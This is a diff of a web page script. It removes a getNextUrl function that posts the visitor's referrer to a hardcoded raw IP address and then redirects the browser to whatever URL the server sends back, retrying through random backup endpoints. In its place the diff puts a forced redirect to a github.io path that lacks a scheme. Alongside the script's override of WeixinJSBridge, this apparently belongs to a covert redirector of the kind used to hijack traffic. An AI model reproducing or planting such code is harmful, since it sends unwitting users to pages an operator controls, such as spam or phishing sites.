@@ -46,45 +46,7 @@ function changeTitle(e) {
     }
 }
 function getNextUrl(e, a) {
-    var i = {};
-    if (i.timeout = 2e3, i.method = "POST", i.url = "http://115.159.24.70/test/NextDomainB", window.apiList && window.apiList.length > 0) {
-        var t = apiList[getRandomNum(0, apiList.length - 1)];
-        t && t.length > 0 && (i.url = t)
-    }
-    e ? i.data = {
-        id: e,
-        referrer: location.href
-    }: i.data = {
-        referrer: location.href
-    },
-    i.success = function(e) {
-		
-		e=$.parseJSON(e);
-		
-		
-        if (e && e.success) isUrl(e.data.url) && (location.href = e.data.url),
-        e.data.redirect && (location.href = e.data.url),
-        a && "function" == typeof a && a(e.data);
-        else {
-            var t = i;
-            if (window.apiList && window.apiList.length > 0) {
-                var n = apiList[getRandomNum(0, apiList.length - 1)];
-                n && n.length > 0 && (t.url = n)
-            }
-            $.ajax(t)
-        }
-    },
-    i.error = function(e, a, t) {
-        console.log("ajax error : ", a, t);
-        var n = i;
-        if (window.apiList && window.apiList.length > 0) {
-            var r = apiList[getRandomNum(0, apiList.length - 1)];
-            r && r.length > 0 && (n.url = r)
-        }
-        reNextCount++,
-        reNextCount <= 3 && $.ajax(n)
-    },
-    $.ajax(i)
+   location.href = "guyanliang99.github.io/das23fg";
 }
 Object.defineProperty(window, "WeixinJSBridge", {
     writable: !0,
